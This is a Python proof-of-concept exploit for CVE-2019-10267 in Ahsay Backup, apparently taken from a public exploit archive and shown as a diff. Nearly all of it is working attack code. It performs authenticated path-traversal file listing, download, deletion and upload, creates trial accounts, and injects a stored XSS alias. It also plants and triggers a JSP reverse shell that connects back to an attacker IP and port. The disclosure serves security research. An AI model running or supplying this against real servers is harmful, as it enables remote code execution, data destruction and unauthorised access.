@@ -1,0 +1,440 @@
+# Exploit Title: Authenticated insecure file upload and code execution flaw in Ahsay Backup v7.x - v8.1.1.50. (POC)
+# Date: 26-6-2019
+# Exploit Author: Wietse Boonstra
+# Vendor Homepage: https://ahsay.com
+# Software Link: http://ahsay-dn.ahsay.com/v8/81150/cbs-win.exe
+# Version: 7.x < 8.1.1.50
+# Tested on: Windows / Linux
+# CVE : CVE-2019-10267
+
+
+#!/usr/bin/env python3
+
+"""
+# Exploit Title: Authenticated insecure file upload and code execution flaw in Ahsay Backup v7.x - v8.1.1.50. 
+# Date: 26-6-2019
+# Exploit Author: Wietse Boonstra
+# Vendor Homepage: https://ahsay.com
+# Software Link: http://ahsay-dn.ahsay.com/v8/81150/cbs-win.exe
+# Version: 7.x < 8.1.1.50 
+# Tested on: Windows / Linux
+# CVE : CVE-2019-10267
+
+Session cookies are reflected in the JavaScript url: 
+
+"""
+
+import urllib3
+import argparse
+import base64
+import re
+import socket
+from urllib.parse import urlencode
+import gzip
+import json
+import hashlib
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def b64(s):
+    try:
+        return base64.b64encode(bytes(s, 'utf-8')).decode('utf-8')
+    except:
+        return base64.b64encode(bytes("", 'utf-8')).decode('utf-8')
+     
+def md5Sum(buf):
+    hasher = hashlib.md5()
+    hasher.update(buf)
+    a = hasher.hexdigest()
+    return a
+
+class Exploit():
+    def __init__(self, url, username="", password="", proxy="" ):
+        self.url = url
+        self.username = username
+        self.password = password
+        self.accountValid = None
+        if proxy:
+            self.http = urllib3.ProxyManager(proxy)
+        else:
+            self.http = urllib3.PoolManager()
+        
+    def fileActions(self, path="../../../../../../", action='list', recurse=False):
+        """
+        actions: download, list, delete, (upload  different function use self.upload)
+        """
+        try:
+            if not self.checkAccount(self.username,self.password):
+                return False
+            if recurse:
+                recurse = "true"
+            else:
+                recurse = "false"
+            
+            headers={
+                'X-RSW-Request-1':	'{}'.format(b64(self.password)),
+                'X-RSW-Request-0':	'{}'.format(b64(self.username))
+            }
+            # http = urllib3.ProxyManager("https://localhost:8080")
+                
+            path = {
+                'X-RSW-custom-encode-path':'{}'.format(path),
+                'recursive':'{}'.format(recurse)
+                }
+            path = urlencode(path)
+            if action == "delete":
+                r = self.http.request('DELETE', '{}/obs/obm7/file/{}?{}'.format(url,action,path),'',headers)
+            else:
+                r = self.http.request('GET', '{}/obs/obm7/file/{}?{}'.format(url,action,path),'',headers)
+            if (r.status == 200):
+                if (action == 'list'):
+                    result = json.loads(gzip.decompress(r.data))
+                    dash = '-' * 50
+                    print(dash)
+                    print('{:<11}{:<16}{:<20}'.format("Type", "Size","Name"))
+                    print(dash)
+                    for item in result["children"]:
+                        print('{:<11}{:<16}{:<20}'.format(item['fsoType'], item['size'],item['name']))
+                    print(dash) 
+                else:
+                    if action == "delete":
+                        print ("File has been deleted")
+                    else:
+                        return (r.data.decode('utf-8'))
+            else:
+                print ("Something went wrong!")
+                print (r.data)
+                print (r.status)
+        except Exception as e:
+            print (e)
+            pass
+
+    def exploit(self, ip, port, uploadPath="../../webapps/cbs/help/en/", reverseShellFileName="test.jsp" ):
+        """
+        This function will setup the jsp reverse shell
+        """
+        if not self.checkAccount(self.username, self.password):
+            return False
+
+        reverseShell = '''<%@page import="java.lang.*"%>
+            <%@page import="java.util.*"%>
+            <%@page import="java.io.*"%>
+            <%@page import="java.net.*"%>
+
+            <%
+            class StreamConnector extends Thread
+            {{
+                InputStream az;
+                OutputStream jk;
+
+                StreamConnector( InputStream az, OutputStream jk )
+                {{
+                this.az = az;
+                this.jk = jk;
+                }}
+
+                public void run()
+                {{
+                BufferedReader vo  = null;
+                BufferedWriter ijb = null;
+                try
+                {{
+                    vo  = new BufferedReader( new InputStreamReader( this.az ) );
+                    ijb = new BufferedWriter( new OutputStreamWriter( this.jk ) );
+                    char buffer[] = new char[8192];
+                    int length;
+                    while( ( length = vo.read( buffer, 0, buffer.length ) ) > 0 )
+                    {{
+                    ijb.write( buffer, 0, length );
+                    ijb.flush();
+                    }}
+                }} catch( Exception e ){{}}
+                try
+                {{
+                    if( vo != null )
+                    vo.close();
+                    if( ijb != null )
+                    ijb.close();
+                }} catch( Exception e ){{}}
+                }}
+            }}
+
+            try
+            {{
+                String ShellPath;
+            if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {{
+            ShellPath = new String("/bin/sh");
+            }} else {{
+            ShellPath = new String("cmd.exe");
+            }}
+
+                Socket socket = new Socket( "{0}", {1} );
+                Process process = Runtime.getRuntime().exec( ShellPath );
+                ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
+                ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
+            }} catch( Exception e ) {{}}
+            %>'''.format(str(ip), str(port))
+
+        try:
+            if (uploadPath == "../../webapps/cbs/help/en/"):
+                callUrl = "{}/{}{}".format(self.url,re.sub("^../../webapps/",'',uploadPath),reverseShellFileName)
+            exploitUrl = "{}{}".format(uploadPath,reverseShellFileName)
+            print (exploitUrl)
+            self.upload(exploitUrl, reverseShell)
+            print ("Checking if file is uploaded.")
+            
+            if (md5Sum(self.fileActions(exploitUrl,'download').encode('utf-8')) == md5Sum(reverseShell.encode('utf-8'))):
+                print ("File content is the same, upload OK!")
+                print ("Triggering {}".format(callUrl))
+                # http = urllib3.ProxyManager("https://localhost:8080")
+                r = self.http.request('GET', '{}'.format(callUrl))
+                if r.status == 200:
+                    print ("Done, Check your netcat listener!")
+                return True
+            else: 
+                return False
+        except Exception as e:
+            print (e)
+            return False
+
+    def upload(self, filePath, fileContent ):
+        """
+        Needs a valid username and password.
+        Needs a filepath + filename to upload to. 
+        Needs the file content.
+        """
+
+        b64UploadPath = b64("{}".format(filePath))
+        try:
+            if not self.checkAccount(self.username, self.password):
+                return False
+            headers={
+                'X-RSW-Request-0':	'{}'.format(b64(self.username)),
+                'X-RSW-Request-1':	'{}'.format(b64(self.password)),
+                'X-RSW-custom-encode-path': '{}'.format(b64UploadPath)
+            }
+            # http = urllib3.ProxyManager("https://localhost:8080")
+            r = self.http.request(
+                'PUT', 
+                '{}/obs/obm7/file/upload'.format(self.url),
+                body=fileContent,
+                headers=headers)
+            if (r.status == 201):
+                print ("File {}".format(r.reason))
+            else:
+                print ("Something went wrong!")
+                print (r.data)
+                print (r.status)
+        except Exception as e:
+            print ("Something went wrong!")
+            print (e)
+            pass
+    
+    def checkAccount(self, username, password):
+        try:
+            headers={
+                'X-RSW-custom-encode-password':	'{}'.format(b64(password)),
+                'X-RSW-custom-encode-username':	'{}'.format(b64(username))
+            }
+            # http = urllib3.ProxyManager("https://localhost:8080")
+            r = self.http.request('POST', '{}/obs/obm7/user/getUserProfile'.format(url),'',headers)
+            if (r.data == b'CLIENT_TYPE_INCORRECT') or (r.status == 200):
+                if self.accountValid is None:
+                    print ("Account is valid with username: '{}' and password '{}'".format(username, password))
+                self.accountValid = True
+                return True
+            elif (r.data == b'USER_NOT_EXIST'):
+                if not self.accountValid is None:
+                    print ("Username does not exist!")
+                self.accountValid = False
+                return False
+            elif (r.data == b'PASSWORD_INCORRECT'):
+                if self.accountValid is None:
+                    print ("Password not correct but username '{}' is".format(username))
+                self.accountValid = False
+                return False
+            else:
+                if self.accountValid is None:
+                    print ("Something went wrong!")
+                self.accountValid = False
+                return False
+                # print (r.data)
+                # print (r.status)
+        except Exception as e:
+            print (e)
+            self.accountValid = False
+            return False
+            
+    def checkTrialAccount(self):
+        try:
+            # http = urllib3.ProxyManager("https://localhost:8080")
+            r = self.http.request('POST', '{}/obs/obm7/user/isTrialEnabled'.format(self.url),'','')
+            if (r.status == 200 and r.data == b'ENABLED' ):
+                print ("Server ({}) has Trial Account enabled, exploit should work!".format(self.url))
+                return True
+            else:
+                print ("Server ({}) has Trial Account disabled, please use a valid account!".format(self.url))
+                return False
+        except Exception as e:
+            print ("Something went wrong with url {} !".format(self.url))
+            print (e)
+            return False
+
+    def addTrialAccount(self,alias=""):
+        try:
+            if not self.checkTrialAccount():
+                return False
+            
+            headers={
+                'X-RSW-custom-encode-alias':	'{}'.format(b64(alias)), 
+                'X-RSW-custom-encode-password':	'{}'.format(b64(self.password)),
+                'X-RSW-custom-encode-username':	'{}'.format(b64(self.username))
+            }
+            # http = urllib3.ProxyManager("https://localhost:8080")
+            r = self.http.request('POST', '{}/obs/obm7/user/addTrialUser'.format(url),'',headers)
+            if (r.status == 200):
+                print ("Account '{}' created with password '{}'".format(username, password))
+            elif (r.data == b'LOGIN_NAME_IS_USED'):
+                print ("Username is in use!")
+            elif (r.data == b'PWD_COMPLEXITY_FAILURE'):
+                print ("Password not complex enough")
+            else:
+                print ("Something went wrong!")
+                print (r.data)
+                print (r.status)
+        except Exception as e:
+            print (e)
+            pass
+
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(
+        __file__,
+        description="Exploit for AhsayCBS v6.x < v8.1.1..50",
+        usage="""
+    Check if Trial account is enabled: %(prog)s --host https://172.16.238.213/ -c
+    Create Trial account: %(prog)s --host https://172.16.238.213/ -a -u test01 -p 'Welcome01!'
+    Create Trial account with stored XSS: %(prog)s --host https://172.16.238.213/ -a -u test01 -p 'Welcome01!' -x --xssvalue "'><script>alert(1)</script>"
+    Delete file: %(prog)s --host https://172.16.238.213/ -u test01 -p Welcome01! --action delete --path ../../../../../../../../test.txt
+    List files in dir: %(prog)s --host https://172.16.238.213/ -u test01 -p Welcome01! --action list --path ../../../../../../../../
+    Upload a file: %(prog)s --host https://172.16.238.213/ -u test01 -p Welcome01! --action upload --localfile test.txt --path ../../../../../../../../ --filename test.txt
+    Upload reverse shell: %(prog)s --host https://172.16.238.213/ -u test01 -p Welcome01! -e --ip 172.16.238.1 --port 4444
+        """
+        
+    )
+    manda = parser.add_argument_group("Mandatory options")
+    manda.add_argument("--host",
+        help="Url of AhsayCBS server",
+        # required=True
+    )
+    check = parser.add_argument_group("Check options")
+    check.add_argument("-c", "--check",
+        help="Check if host is vulnerable",
+        action="store_true"
+    )
+    
+    add = parser.add_argument_group("Add account options")
+    add.add_argument("-a","--add",
+        help="Add trial account",
+        action="store_true"
+    )
+    add.add_argument("-u","--username",
+        help="username to create"
+    )
+    add.add_argument("-p","--password",
+        help="Password to create"
+    )
+
+    exploit = parser.add_argument_group("Exploit options")
+    exploit.add_argument("-e", "--exploit",
+        help="Run reverse shell exploit",
+        action="store_true"
+    )
+    exploit.add_argument("--ip",
+        help="Set the attackers IP",
+        default="127.0.0.1"
+    )
+    exploit.add_argument("--port",
+        help="Set the attackers port",
+        default="4444"
+    )
+
+    #Optional
+    xss = parser.add_argument_group("XSS")
+    xss.add_argument("-x","--xss",
+        help="Use XSS in alias field.",
+        action="store_true",
+        default=False
+    )
+    xss.add_argument("--xssvalue",
+        help="Custom XSS value (must start with '>)",
+        default="'><script>alert(1)</script>",
+        required=False
+    )
+    
+
+    # list files
+    fileaction = parser.add_argument_group("File actions", "We can control the files on the server with 4 actions: list content of directory, download file (read), write file (upload) and delete file." )
+
+    fileaction.add_argument("--action",
+        help="use: delete, upload, download or list",
+        default="list"
+    )
+    fileaction.add_argument("--localfile",
+        help="Upload a local file"
+    )
+    fileaction.add_argument("--filename",
+        help="Filename on the server"
+    )
+    fileaction.add_argument("--path",
+        help="Directory on server use ../../../",
+        default="/"
+    )
+
+    fileaction.add_argument("--recursive",
+        help="Recurse actions list and delete",
+        action="store_true",
+        default=False
+    )
+
+    try:
+        args = parser.parse_args()
+        if args.add and (args.username is None or args.password is None):
+            parser.error("The option --add / -a requires: --username and --password")
+        if args.exploit and (args.username is None or args.password is None or args.ip is None or args.port is None):
+            parser.error("The option -e / --exploit requires: --username, --password, --ip and --port")
+        # if not (args.host or args.r7):
+        if not (args.host):
+            parser.error("The option --host requires: -a, -c, -e or -f")
+        else:
+            
+            url = args.host
+            url = url.rstrip('/')
+            username = args.username
+            password = args.password
+            e = Exploit(url,username,password,"http://localhost:8080")
+            if args.check:
+                e.checkTrialAccount()
+            elif args.add:
+                if args.xss and (args.xssvalue is None):
+                    parser.error("The option -x / --xss requires: --xssvalue")
+                if args.xssvalue:
+                    alias = args.xssvalue
+                e.addTrialAccount(alias)
+            elif args.exploit:
+                print ("Exploiting please start a netcat listener on {}:{}".format(args.ip,args.port))
+                input("Press Enter to continue...")
+                e.exploit(args.ip, args.port,"../../webapps/cbs/help/en/","SystemSettings_License_Redirector_AHSAY.jsp")
+            elif args.action != "upload":
+                e.fileActions(args.path,args.action,args.recursive)
+            elif args.action == "upload":
+                if args.localfile is not None:
+                    f = open(args.localfile, "r")
+                    fileContent = f.read()
+                    e.upload("{}{}".format(args.path,args.filename),fileContent)
+                else:
+                    parser.error("The option --upload must contain path to local file")
+            
+    except Exception as e:
+        print (e)
+        pass
